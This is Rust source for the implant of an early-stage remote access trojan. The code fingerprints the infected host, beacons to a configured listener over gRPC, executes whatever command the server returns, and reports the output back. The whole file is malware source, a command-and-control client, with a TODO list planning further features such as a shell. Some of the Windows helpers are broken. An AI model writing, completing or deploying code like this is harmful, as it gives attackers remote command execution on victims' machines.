use remote_access_trojan::rat::ask_for_instructions_client::AskForInstructionsClient;
use remote_access_trojan::rat::record_command_result_client::RecordCommandResultClient;
use remote_access_trojan::rat::{Beacon, CommandResponse};
use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};
use std::process::Command;
use std::thread;
use std::time::{Duration, SystemTime};
use tonic::transport::Endpoint;

// Some TODOs in no meaningful order
/*
Define what a command is, and get some cross platform definitions in place
    - help
    - change beacon cadence
    - drop into a shell 
Make the beacons run in a loop
Figure out the implementation of getting commands newer than last run
Log actions on the server
Have a real client do things
*/

#[cfg(target_os = "linux")]
fn get_ip_address() -> String {
    let ip_address = Command::new("hostname")
                            .arg("-I")
                            .output()
                            .unwrap();
    let ip_address = String::from_utf8(ip_address.stdout).unwrap();
    let ip_address = ip_address.trim();
    ip_address.to_string()
}

#[cfg(windows)]
fn get_ip_address() -> String {
    let ip_address = Command::new("ipconfig")
                            .arg("|")
                            .arg("findstr")
                            .arg("IPv4")
                            .output()
                            .unwrap();
    let ip_address = String::from_utf8(ip_address.stdout).unwrap();
    let ip_address: Vec<&str> = ip_address.split(":").collect();
    let ip_address = ip_address[1].trim();
    ip_address.to_string()
}

#[cfg(target_os = "linux")]
fn get_directory_listing() -> String {
    let directory = Command::new("ls")
                            .output()
                            .unwrap();
    let directory = String::from_utf8(directory.stdout).unwrap();
    let directory = directory.trim();
    directory.to_string()
}

#[cfg(windows)]
fn get_directory_listing() -> String {
    let directory = Command::new("dir")
                            .output()
                            .unwrap();
    let directory = String::from_utf8(directory.stdout).unwrap();
    let directory = directory.trim();
    directory.to_string()
}

fn calculate_hash<T: Hash>(t: &T) -> u64 {
    let mut s = DefaultHasher::new();
    t.hash(&mut s);
    s.finish()
}

fn generate_implant_id() -> String {
    let hostname = Command::new("hostname")
                            .output()
                            .unwrap();
    let hostname = String::from_utf8(hostname.stdout).unwrap();
    let hostname = hostname.trim();

    // This will work on Linux. Need to do "ipconfig | findstr IPv4" or something similar on Windows
    let ip_address = get_ip_address();

    let hashed_value = calculate_hash(&format!("{hostname}:{ip_address}"));
    format!("{hashed_value:x}")
}

#[cfg(target_os = "linux")]
fn get_operating_system() -> String {
    let os = Command::new("cat")
                    .arg("/proc/version")
                    .output()
                    .unwrap();
    let os = String::from_utf8(os.stdout).unwrap();
    let os = os.trim();
    os.to_string()
}

#[cfg(windows)]
fn get_operating_system() -> String {
    let os = Command::new("systeminfo")
                    .arg("|")
                    .arg("findstr")
                    .arg("OS ")
                    .output()
                    .unwrap();
    let os = String::from_utf8(os.stdout).unwrap();
    let os = os.trim();
    os.to_string()
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("implant");

    let implant_id = generate_implant_id();
    let cadence = Duration::from_millis(10000);
    // Can I send a protobuf from the client to the server?
    let ip_address = rco_config::LISTENER_IP;
    let port = rco_config::LISTENER_PORT;
    let socket = format!("http://{ip_address}:{port}");
    let channel = Endpoint::from_shared(socket)?
                        .connect()
                        .await?;
    let mut ask_client = AskForInstructionsClient::new(channel.clone());
    let mut response_client = RecordCommandResultClient::new(channel);

    loop {
        let request = tonic::Request::new(
            Beacon {
                last_received: 0
            },
        );
        let response = ask_client.send(request).await?.into_inner();
        println!("Response={response:?}");

        let command_received = response.command;
        if !command_received.is_empty() {
            let command = Command::new(&command_received)
                                .output()
                                .unwrap();
            let command_response = String::from_utf8(command.stdout).unwrap();
            let result = tonic::Request::new(
                CommandResponse {
                    implant_id: implant_id.clone(),
                    timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                    command: command_received,
                    result: command_response
                },
            );
            let response = response_client.send(result).await?.into_inner();
            println!("{response:?}");
        }
        thread::sleep(cadence);
    }

    Ok(())
}